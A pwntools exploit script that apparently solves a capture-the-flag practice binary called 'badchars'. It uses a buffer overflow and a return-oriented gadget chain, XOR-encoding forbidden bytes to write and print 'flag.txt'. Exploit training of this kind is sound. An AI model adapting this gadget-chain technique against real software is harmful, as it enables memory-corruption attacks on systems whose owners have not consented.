from pwn import *

r = process("./badchars")

def ascii2hex(value):
    result = ""
    for i in value:
        result += hex(ord(i))[2:]
    return result

def doiVe0x(value):
    length = len(value)
    result = "0x"
    for i in range(length-1, 0, -2):
        result += value[i-1] + value[i]
    return result

def process(value):
    return int(doiVe0x(ascii2hex(value)), 16)

def processBadchar(value):
    result = ""
    for i in value:
        result += chr(int(ascii2hex(i), 16) ^ 2)
    return process(result)


pop_r12 = 0x000000000040069c
r12 = processBadchar("flag.txt")
r13 = 0x601030
mov_r13_r12 = 0x400634
xor_r14_r15 = 0x400628
pop_r14 = 0x00000000004006a0
pop_rdi = 0x00000000004006a3
print_file = 0x0000000000400620

payload = b'a'*40
payload += p64(pop_r12)
payload += p64(r12) + p64(r13) + p64(0) + p64(0)
payload += p64(mov_r13_r12)

for i in range(8):
    payload += p64(pop_r14)
    payload += p64(2) + p64(r13 + i)
    payload += p64(xor_r14_r15)

payload += p64(pop_rdi)
payload += p64(r13)
payload += p64(print_file)

r.sendafter('> ', payload)
r.interactive()